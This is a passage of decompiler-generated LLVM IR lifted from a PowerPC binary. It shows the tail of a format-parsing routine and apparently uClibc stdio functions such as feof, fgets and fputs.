dec_label_pc_1000c99c:                            ; preds = %dec_label_pc_1000c934, %dec_label_pc_1000c990
  %v0_1000c99c = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000c99c, 1
  br i1 %tmp62, label %dec_label_pc_1000ca78, label %dec_label_pc_1000c9a4

dec_label_pc_1000c9a4:                            ; preds = %dec_label_pc_1000c99c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000c9a8

dec_label_pc_1000c9a8:                            ; preds = %dec_label_pc_1000ca60, %dec_label_pc_1000c9a4
  %v0_1000c9d0 = phi i32 [ 0, %dec_label_pc_1000c9a4 ], [ %v1_1000ca64, %dec_label_pc_1000ca60 ]
  %v2_1000c9a8 = icmp sgt i32 %v0_1000c9d0, 2
  br i1 %v2_1000c9a8, label %dec_label_pc_1000c9cc, label %dec_label_pc_1000c9b0

dec_label_pc_1000c9b0:                            ; preds = %dec_label_pc_1000c9a8
  %v1_1000c9b0 = mul i32 %v0_1000c9d0, 4
  store i32 %v1_1000c9b0, i32* %r0.global-to-local, align 4
  %v0_1000c9b4 = load i32, i32* @r1, align 4
  %v2_1000c9b4 = add i32 %v0_1000c9b4, %v1_1000c9b0
  store i32 %v2_1000c9b4, i32* %r9.global-to-local, align 4
  %v1_1000c9b8 = add i32 %v2_1000c9b4, 20
  %v2_1000c9b8 = inttoptr i32 %v1_1000c9b8 to i32*
  %v3_1000c9b8 = load i32, i32* %v2_1000c9b8, align 4
  store i32 %v3_1000c9b8, i32* %r0.global-to-local, align 4
  %v1_1000c9bc = load i32, i32* @r28, align 4
  %v2_1000c9bc = add i32 %v1_1000c9bc, %v0_1000c9d0
  store i32 %v2_1000c9bc, i32* %r9.global-to-local, align 4
  %v1_1000c9c0 = urem i32 %v3_1000c9b8, 256
  store i32 %v1_1000c9c0, i32* %r11.global-to-local, align 4
  %v1_1000c9c4 = trunc i32 %v3_1000c9b8 to i8
  %v3_1000c9c4 = add i32 %v2_1000c9bc, 36
  %v4_1000c9c4 = inttoptr i32 %v3_1000c9c4 to i8*
  store i8 %v1_1000c9c4, i8* %v4_1000c9c4, align 1
  %v0_1000c9d8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c9d8

dec_label_pc_1000c9cc:                            ; preds = %dec_label_pc_1000c9a8
  %v2_1000c9d0 = add i32 %v0_1000c9d0, %stack_var_-84.3
  store i32 %v2_1000c9d0, i32* %r9.global-to-local, align 4
  %v1_1000c9d4 = add i32 %v2_1000c9d0, -2
  store i32 %v1_1000c9d4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c9d8

dec_label_pc_1000c9d8:                            ; preds = %dec_label_pc_1000c9b0, %dec_label_pc_1000c9cc
  %v0_1000c9f8 = phi i32 [ %v0_1000c9d8.pre, %dec_label_pc_1000c9b0 ], [ %v1_1000c9d4, %dec_label_pc_1000c9cc ]
  %v1_1000c9d8 = load i32, i32* @r26, align 4
  %v3_1000c9d8 = icmp sgt i32 %v0_1000c9f8, %v1_1000c9d8
  br i1 %v3_1000c9d8, label %dec_label_pc_1000c9e0, label %dec_label_pc_1000c9ec

dec_label_pc_1000c9e0:                            ; preds = %dec_label_pc_1000c9d8
  %v2_1000c9e0 = icmp sgt i32 %v0_1000c9f8, 9
  br i1 %v2_1000c9e0, label %dec_label_pc_1000cad4, label %dec_label_pc_1000c9e8

dec_label_pc_1000c9e8:                            ; preds = %dec_label_pc_1000c9e0
  store i32 %v0_1000c9f8, i32* @r26, align 4
  br label %dec_label_pc_1000c9ec

dec_label_pc_1000c9ec:                            ; preds = %dec_label_pc_1000c9d8, %dec_label_pc_1000c9e8
  store i32 %v2_1000c688.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000c9f0 = load i32, i32* @r27, align 4
  %v1_1000c9f0 = mul i32 %v0_1000c9f0, 4
  store i32 %v1_1000c9f0, i32* %r0.global-to-local, align 4
  %v2_1000c9f4 = add i32 %v1_1000c9f0, %v2_1000c688.pre-phi
  %v3_1000c9f4 = inttoptr i32 %v2_1000c9f4 to i32*
  %v4_1000c9f4 = load i32, i32* %v3_1000c9f4, align 4
  store i32 %v4_1000c9f4, i32* @r31, align 4
  %v1_1000c9f8 = add i32 %v0_1000c9f8, -1
  store i32 %v1_1000c9f8, i32* @r25, align 4
  %v1_1000c9fc = mul i32 %v1_1000c9f8, 4
  %v3_1000ca00 = icmp eq i32 %v4_1000c9f4, 8
  %v1_1000ca04 = load i32, i32* @r28, align 4
  %v2_1000ca04 = add i32 %v1_1000ca04, %v1_1000c9fc
  store i32 %v2_1000ca04, i32* %r9.global-to-local, align 4
  %v1_1000ca08 = add i32 %v2_1000ca04, 40
  %v2_1000ca08 = inttoptr i32 %v1_1000ca08 to i32*
  %v3_1000ca08 = load i32, i32* %v2_1000ca08, align 4
  store i32 %v3_1000ca08, i32* %r3.global-to-local, align 4
  br i1 %v3_1000ca00, label %dec_label_pc_1000ca60, label %dec_label_pc_1000ca10

dec_label_pc_1000ca10:                            ; preds = %dec_label_pc_1000c9ec
  %v3_1000ca10 = icmp eq i32 %v3_1000ca08, 8
  br i1 %v3_1000ca10, label %dec_label_pc_1000ca48, label %dec_label_pc_1000ca18

dec_label_pc_1000ca18:                            ; preds = %dec_label_pc_1000ca10
  %v4_1000ca18 = icmp eq i32 %v3_1000ca08, %v4_1000c9f4
  br i1 %v4_1000ca18, label %dec_label_pc_1000ca48, label %dec_label_pc_1000ca20

dec_label_pc_1000ca20:                            ; preds = %dec_label_pc_1000ca18
  %v1_1000ca20 = call i32 @_promoted_size(i32 %v3_1000ca08)
  store i32 %v1_1000ca20, i32* @r29, align 4
  %v0_1000ca28 = load i32, i32* @r31, align 4
  store i32 %v0_1000ca28, i32* %r3.global-to-local, align 4
  %v1_1000ca2c = call i32 @_promoted_size(i32 %v0_1000ca28)
  store i32 %v1_1000ca2c, i32* %r3.global-to-local, align 4
  %v0_1000ca38 = call i32 @__asm_mfcr()
  store i32 %v0_1000ca38, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ca38, i32* %r0.global-to-local, align 4
  %v1_1000ca3c = call i32 @__asm_rlwinm(i32 %v0_1000ca38, i32 31, i32 31, i32 31)
  store i32 %v1_1000ca3c, i32* %r0.global-to-local, align 4
  %v3_1000ca40 = icmp eq i32 %v1_1000ca3c, 0
  br i1 %v3_1000ca40, label %dec_label_pc_1000ca60, label %dec_label_pc_1000ca20.dec_label_pc_1000ca48_crit_edge

dec_label_pc_1000ca20.dec_label_pc_1000ca48_crit_edge: ; preds = %dec_label_pc_1000ca20
  %v0_1000ca4c.pre = load i32, i32* @r27, align 4
  %v0_1000ca54.pre = load i32, i32* @r25, align 4
  %v1_1000ca58.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000ca48

dec_label_pc_1000ca48:                            ; preds = %dec_label_pc_1000ca20.dec_label_pc_1000ca48_crit_edge, %dec_label_pc_1000ca18, %dec_label_pc_1000ca10
  %v1_1000ca58 = phi i32 [ %v1_1000ca58.pre, %dec_label_pc_1000ca20.dec_label_pc_1000ca48_crit_edge ], [ %v1_1000ca04, %dec_label_pc_1000ca18 ], [ %v1_1000ca04, %dec_label_pc_1000ca10 ]
  %v0_1000ca54 = phi i32 [ %v0_1000ca54.pre, %dec_label_pc_1000ca20.dec_label_pc_1000ca48_crit_edge ], [ %v1_1000c9f8, %dec_label_pc_1000ca18 ], [ %v1_1000c9f8, %dec_label_pc_1000ca10 ]
  %v0_1000ca4c = phi i32 [ %v0_1000ca4c.pre, %dec_label_pc_1000ca20.dec_label_pc_1000ca48_crit_edge ], [ %v0_1000c9f0, %dec_label_pc_1000ca18 ], [ %v0_1000c9f0, %dec_label_pc_1000ca10 ]
  store i32 %v2_1000c688.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000ca4c = mul i32 %v0_1000ca4c, 4
  store i32 %v1_1000ca4c, i32* %r0.global-to-local, align 4
  %v2_1000ca50 = add i32 %v1_1000ca4c, %v2_1000c688.pre-phi
  %v3_1000ca50 = inttoptr i32 %v2_1000ca50 to i32*
  %v4_1000ca50 = load i32, i32* %v3_1000ca50, align 4
  store i32 %v4_1000ca50, i32* %r0.global-to-local, align 4
  %v1_1000ca54 = mul i32 %v0_1000ca54, 4
  %v2_1000ca58 = add i32 %v1_1000ca54, %v1_1000ca58
  store i32 %v2_1000ca58, i32* %r9.global-to-local, align 4
  %v2_1000ca5c = add i32 %v2_1000ca58, 40
  %v3_1000ca5c = inttoptr i32 %v2_1000ca5c to i32*
  store i32 %v4_1000ca50, i32* %v3_1000ca5c, align 4
  br label %dec_label_pc_1000ca60

dec_label_pc_1000ca60:                            ; preds = %dec_label_pc_1000ca20, %dec_label_pc_1000c9ec, %dec_label_pc_1000ca48
  %v0_1000ca60 = load i32, i32* @r28, align 4
  %v1_1000ca60 = add i32 %v0_1000ca60, 28
  %v2_1000ca60 = inttoptr i32 %v1_1000ca60 to i32*
  %v3_1000ca60 = load i32, i32* %v2_1000ca60, align 4
  %v0_1000ca64 = load i32, i32* @r27, align 4
  %v1_1000ca64 = add i32 %v0_1000ca64, 1
  store i32 %v1_1000ca64, i32* @r27, align 4
  %v1_1000ca68 = add i32 %v3_1000ca60, 2
  store i32 %v1_1000ca68, i32* %r9.global-to-local, align 4
  %v2_1000ca6c = icmp slt i32 %v1_1000ca64, %v1_1000ca68
  br i1 %v2_1000ca6c, label %dec_label_pc_1000c9a8, label %dec_label_pc_1000ca90

dec_label_pc_1000ca78:                            ; preds = %dec_label_pc_1000c99c
  %v0_1000ca78 = load i32, i32* @r28, align 4
  %v1_1000ca78 = add i32 %v0_1000ca78, 28
  %v2_1000ca78 = inttoptr i32 %v1_1000ca78 to i32*
  %v3_1000ca78 = load i32, i32* %v2_1000ca78, align 4
  store i32 %v3_1000ca78, i32* %r5.global-to-local, align 4
  %v1_1000ca7c = add i32 %v0_1000ca78, 40
  store i32 %v1_1000ca7c, i32* @r3, align 4
  %v0_1000ca80 = load i32, i32* @r7, align 4
  %v1_1000ca80 = trunc i32 %v0_1000ca80 to i8
  %v3_1000ca80 = add i32 %v0_1000ca78, 38
  %v4_1000ca80 = inttoptr i32 %v3_1000ca80 to i8*
  store i8 %v1_1000ca80, i8* %v4_1000ca80, align 1
  %v2_1000ca84 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000ca84, i32* @r4, align 4
  %v0_1000ca88 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ca88 = mul i32 %v0_1000ca88, 4
  store i32 %v1_1000ca88, i32* @r5, align 4
  store i32 268487312, i32* @lr, align 4
  %v0_1000ca8c = call i32 @memcpy()
  store i32 %v0_1000ca8c, i32* %r3.global-to-local, align 4
  %v0_1000ca90.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000ca90

dec_label_pc_1000ca90:                            ; preds = %dec_label_pc_1000ca60, %dec_label_pc_1000ca78
  %v0_1000ca90 = phi i32 [ %v0_1000ca90.pre, %dec_label_pc_1000ca78 ], [ %v0_1000ca60, %dec_label_pc_1000ca60 ]
  %v1_1000ca90 = add i32 %v0_1000ca90, 16
  %v2_1000ca90 = inttoptr i32 %v1_1000ca90 to i32*
  %v3_1000ca90 = load i32, i32* %v2_1000ca90, align 4
  store i32 %v3_1000ca90, i32* %r0.global-to-local, align 4
  %v0_1000ca94 = load i32, i32* @r26, align 4
  %v2_1000ca94 = add i32 %v0_1000ca90, 24
  %v3_1000ca94 = inttoptr i32 %v2_1000ca94 to i32*
  store i32 %v0_1000ca94, i32* %v3_1000ca94, align 4
  %v0_1000ca98 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ca98 = and i32 %v0_1000ca98, 128
  store i32 %v1_1000ca98, i32* %r9.global-to-local, align 4
  %v3_1000ca98 = icmp eq i32 %v1_1000ca98, 0
  br i1 %v3_1000ca98, label %dec_label_pc_1000caa0, label %dec_label_pc_1000caac

dec_label_pc_1000caa0:                            ; preds = %dec_label_pc_1000ca90
  %v0_1000caa0 = load i32, i32* @r30, align 4
  %v1_1000caa0 = add i32 %v0_1000caa0, 1
  store i32 %v1_1000caa0, i32* %r0.global-to-local, align 4
  %v1_1000caa4 = load i32, i32* @r28, align 4
  %v2_1000caa4 = inttoptr i32 %v1_1000caa4 to i32*
  store i32 %v1_1000caa0, i32* %v2_1000caa4, align 4
  br label %dec_label_pc_1000cac4

dec_label_pc_1000caac:                            ; preds = %dec_label_pc_1000ca90
  %v2_1000caac = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000caac, i32* %r0.global-to-local, align 4
  %v0_1000cab0 = load i32, i32* @r28, align 4
  %v1_1000cab0 = inttoptr i32 %v0_1000cab0 to i32*
  %v2_1000cab0 = load i32, i32* %v1_1000cab0, align 4
  %v1_1000cab4 = load i32, i32* @r30, align 4
  %v2_1000cab4 = sub i32 %v1_1000cab4, %v2_1000caac
  %v1_1000cab8 = mul i32 %v2_1000cab4, 4
  store i32 %v1_1000cab8, i32* %r0.global-to-local, align 4
  %v2_1000cabc = add i32 %v1_1000cab8, %v2_1000cab0
  store i32 %v2_1000cabc, i32* %r9.global-to-local, align 4
  store i32 %v2_1000cabc, i32* %v1_1000cab0, align 4
  br label %dec_label_pc_1000cac4

dec_label_pc_1000cac4:                            ; preds = %dec_label_pc_1000caa0, %dec_label_pc_1000caac
  %v0_1000cac4 = load i32, i32* @r28, align 4
  %v1_1000cac4 = add i32 %v0_1000cac4, 28
  %v2_1000cac4 = inttoptr i32 %v1_1000cac4 to i32*
  %v3_1000cac4 = load i32, i32* %v2_1000cac4, align 4
  store i32 %v3_1000cac4, i32* %r9.global-to-local, align 4
  %v1_1000cac8 = add i32 %v3_1000cac4, 2
  br label %dec_label_pc_1000cad4

dec_label_pc_1000cad4:                            ; preds = %dec_label_pc_1000c638, %dec_label_pc_1000c70c, %dec_label_pc_1000c7e8, %dec_label_pc_1000c7dc, %dec_label_pc_1000c804, %dec_label_pc_1000c740, %dec_label_pc_1000c9e0, %dec_label_pc_1000c890, %dec_label_pc_1000c984, %dec_label_pc_1000cac4
  %storemerge2 = phi i32 [ %v1_1000cac8, %dec_label_pc_1000cac4 ], [ -1, %dec_label_pc_1000c984 ], [ -1, %dec_label_pc_1000c890 ], [ -1, %dec_label_pc_1000c9e0 ], [ -1, %dec_label_pc_1000c740 ], [ -1, %dec_label_pc_1000c804 ], [ -1, %dec_label_pc_1000c7dc ], [ -1, %dec_label_pc_1000c7e8 ], [ -1, %dec_label_pc_1000c70c ], [ -1, %dec_label_pc_1000c638 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000c5d0, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000cab8, { 1, 0 }
  uselistorder i32 %v0_1000ca90, { 1, 0 }
  uselistorder i32 %v1_1000ca64, { 1, 2, 0 }
  uselistorder i32 %v1_1000ca4c, { 1, 0 }
  uselistorder i32 %v0_1000ca38, { 0, 2, 1 }
  uselistorder i32 %v3_1000ca08, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000ca04, { 1, 2, 0 }
  uselistorder i32 %v1_1000c9f8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000c9f0, { 1, 0 }
  uselistorder i32 %v0_1000c9f0, { 1, 2, 0 }
  uselistorder i32 %v3_1000c9b8, { 1, 0, 2 }
  uselistorder i32 %v1_1000c9b0, { 1, 0 }
  uselistorder i32 %v0_1000c9d0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000c928, { 1, 2, 0 }
  uselistorder i32 %v1_1000c900, { 2, 1, 0 }
  uselistorder i32 %v1_1000c8ec, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000c8d0, { 1, 0, 2 }
  uselistorder i32 %v1_1000c89c, { 1, 3, 2, 0 }
  uselistorder i32 %v1_1000c858, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000c81c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000c808, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000c778, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000c774, { 1, 0 }
  uselistorder i32 %v0_1000c78c, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000c6f0, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000c6e8, { 1, 0 }
  uselistorder i32 %v1_1000c6d8, { 1, 0 }
  uselistorder i32 %v3_1000c6d0, { 1, 0, 2 }
  uselistorder i32 %v0_1000c74c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000c71c, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000c6ac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000c694, { 1, 0 }
  uselistorder i32 %v2_1000c688.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000c668, { 1, 0 }
  uselistorder i32 %v1_1000c650, { 1, 2, 0 }
  uselistorder i32 %v0_1000c644, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1001c8e4.851 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1001c8a4.850 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cad4, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000cac4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca90, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c9ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c99c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c890, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c840, { 1, 0 }
  uselistorder label %dec_label_pc_1000c814, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c7c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c738, { 1, 0 }
  uselistorder label %dec_label_pc_1000c730, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c698, { 1, 0 }
  uselistorder label %dec_label_pc_1000c694, { 1, 0 }
  uselistorder label %dec_label_pc_1000c678, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000caf0 = call i32 @__asm_mfcr()
  store i32 %v0_1000caf0, i32* %r31.global-to-local, align 4
  %v2_1000cb14 = add i32 %v0_1000caf0, 52
  %v3_1000cb14 = inttoptr i32 %v2_1000cb14 to i32*
  %v4_1000cb14 = load i32, i32* %v3_1000cb14, align 4
  %v2_1000cb18 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000cb18, i32* @r3, align 4
  %v3_1000cb1c = icmp eq i32 %v4_1000cb14, 0
  store i1 %v3_1000cb1c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000cb1c, label %dec_label_pc_1000cb30, label %dec_label_pc_1000cb30.thread

dec_label_pc_1000cb30.thread:                     ; preds = %entry
  %v1_1000cb383 = inttoptr i32 %v0_1000caf0 to i16*
  %v2_1000cb384 = load i16, i16* %v1_1000cb383, align 2
  %v3_1000cb385 = zext i16 %v2_1000cb384 to i32
  store i32 %v3_1000cb385, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cb44

dec_label_pc_1000cb30:                            ; preds = %entry
  %v0_1000cb24 = call i32 @__pthread_return_void()
  %v0_1000cb2c = call i32 @__pthread_return_0()
  %v0_1000cb38.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000cb3c.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1000cb18, i32* @r3, align 4
  %v1_1000cb38 = inttoptr i32 %v0_1000cb38.pre to i16*
  %v2_1000cb38 = load i16, i16* %v1_1000cb38, align 2
  %v3_1000cb38 = zext i16 %v2_1000cb38 to i32
  store i32 %v3_1000cb38, i32* %r31.global-to-local, align 4
  br i1 %v0_1000cb3c.pre, label %dec_label_pc_1000cb40, label %dec_label_pc_1000cb44

dec_label_pc_1000cb40:                            ; preds = %dec_label_pc_1000cb30
  %v0_1000cb40 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000cb44

dec_label_pc_1000cb44:                            ; preds = %dec_label_pc_1000cb30.thread, %dec_label_pc_1000cb30, %dec_label_pc_1000cb40
  %v3_1000cb386 = phi i32 [ %v3_1000cb385, %dec_label_pc_1000cb30.thread ], [ %v3_1000cb38, %dec_label_pc_1000cb30 ], [ %v3_1000cb38, %dec_label_pc_1000cb40 ]
  %v1_1000cb48 = call i32 @__asm_rlwinm(i32 %v3_1000cb386, i32 0, i32 29, i32 29)
  %v1_1000cb58 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000caf0)
  %v9_1000cb58 = extractvalue %0 %v1_1000cb58, 7
  store i4 %v9_1000cb58, i4* @cr4, align 1
  ret i32 %v1_1000cb48

; uselistorder directives
  uselistorder i32 %v0_1000caf0, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000cb44, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000cb6c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_1000cb6c, i32* %r28.global-to-local, align 4
  %v1_1000cb90 = add i32 %arg3, 52
  %v2_1000cb90 = inttoptr i32 %v1_1000cb90 to i32*
  %v3_1000cb90 = load i32, i32* %v2_1000cb90, align 4
  %v2_1000cb94 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000cb94, i32* @r3, align 4
  %v3_1000cba0 = icmp eq i32 %v3_1000cb90, 0
  store i1 %v3_1000cba0, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000cba0, label %dec_label_pc_1000cba8, label %dec_label_pc_1000cbb4

dec_label_pc_1000cba8:                            ; preds = %entry
  %v0_1000cba8 = call i32 @__pthread_return_void()
  %v0_1000cbb0 = call i32 @__pthread_return_0()
  %v0_1000cbb4.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000cbb8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000cbbc.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000cbb4

dec_label_pc_1000cbb4:                            ; preds = %entry, %dec_label_pc_1000cba8
  %v0_1000cbbc = phi i32 [ %v0_1000cb6c, %entry ], [ %v0_1000cbbc.pre, %dec_label_pc_1000cba8 ]
  %v0_1000cbb8 = phi i32 [ %arg3, %entry ], [ %v0_1000cbb8.pre, %dec_label_pc_1000cba8 ]
  %v0_1000cbb4 = phi i32 [ %arg2, %entry ], [ %v0_1000cbb4.pre, %dec_label_pc_1000cba8 ]
  store i32 268487620, i32* @lr, align 4
  %v3_1000cbc0 = inttoptr i32 %v0_1000cbbc to i8*
  %v4_1000cbc0 = call i32 @__GI_fgets_unlocked(i8* %v3_1000cbc0, i32 %v0_1000cbb4, i32 %v0_1000cbb8)
  store i32 %v4_1000cbc0, i32* @r31, align 4
  store i32 %v2_1000cb94, i32* @r3, align 4
  %v0_1000cbd0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000cbd0, label %dec_label_pc_1000cbd4, label %dec_label_pc_1000cbd8

dec_label_pc_1000cbd4:                            ; preds = %dec_label_pc_1000cbb4
  %v0_1000cbd4 = call i32 @__pthread_return_void()
  %v0_1000cbdc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cbd8

dec_label_pc_1000cbd8:                            ; preds = %dec_label_pc_1000cbb4, %dec_label_pc_1000cbd4
  %v0_1000cbdc = phi i32 [ %v4_1000cbc0, %dec_label_pc_1000cbb4 ], [ %v0_1000cbdc.pre, %dec_label_pc_1000cbd4 ]
  %v1_1000cbec = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000cb6c)
  %v9_1000cbec = extractvalue %0 %v1_1000cbec, 7
  store i4 %v9_1000cbec, i4* @cr4, align 1
  ret i32 %v0_1000cbdc

; uselistorder directives
  uselistorder i32 %v0_1000cb6c, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cbd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000cbb4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000cc00 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_1000cc00, i32* %r29.global-to-local, align 4
  %v2_1000cc20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000cc20, i32* @r3, align 4
  %v1_1000cc24 = add i32 %arg2, 52
  %v2_1000cc24 = inttoptr i32 %v1_1000cc24 to i32*
  %v3_1000cc24 = load i32, i32* %v2_1000cc24, align 4
  %v3_1000cc30 = icmp eq i32 %v3_1000cc24, 0
  store i1 %v3_1000cc30, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000cc30, label %dec_label_pc_1000cc38, label %dec_label_pc_1000cc44

dec_label_pc_1000cc38:                            ; preds = %entry
  %v0_1000cc38 = call i32 @__pthread_return_void()
  %v0_1000cc40 = call i32 @__pthread_return_0()
  %v0_1000cc44.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000cc48.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000cc44

dec_label_pc_1000cc44:                            ; preds = %entry, %dec_label_pc_1000cc38
  %v0_1000cc48 = phi i32 [ %v0_1000cc00, %entry ], [ %v0_1000cc48.pre, %dec_label_pc_1000cc38 ]
  %v0_1000cc44 = phi i32 [ %arg2, %entry ], [ %v0_1000cc44.pre, %dec_label_pc_1000cc38 ]
  store i32 268487760, i32* @lr, align 4
  %v2_1000cc4c = call i32 @__GI_fputs_unlocked(i32 %v0_1000cc48, i32 %v0_1000cc44)
  store i32 %v2_1000cc4c, i32* %r31.global-to-local, align 4
  store i32 %v2_1000cc20, i32* @r3, align 4
  %v0_1000cc5c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000cc5c, label %dec_label_pc_1000cc60, label %dec_label_pc_1000cc64

dec_label_pc_1000cc60:                            ; preds = %dec_label_pc_1000cc44
  %v0_1000cc60 = call i32 @__pthread_return_void()
  %v0_1000cc68.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cc64

dec_label_pc_1000cc64:                            ; preds = %dec_label_pc_1000cc44, %dec_label_pc_1000cc60
  %v0_1000cc68 = phi i32 [ %v2_1000cc4c, %dec_label_pc_1000cc44 ], [ %v0_1000cc68.pre, %dec_label_pc_1000cc60 ]
  %v1_1000cc78 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000cc00)
  %v9_1000cc78 = extractvalue %0 %v1_1000cc78, 7
  store i4 %v9_1000cc78, i4* @cr4, align 1
  ret i32 %v0_1000cc68

; uselistorder directives
  uselistorder i32 %v0_1000cc00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cc64, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc44, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
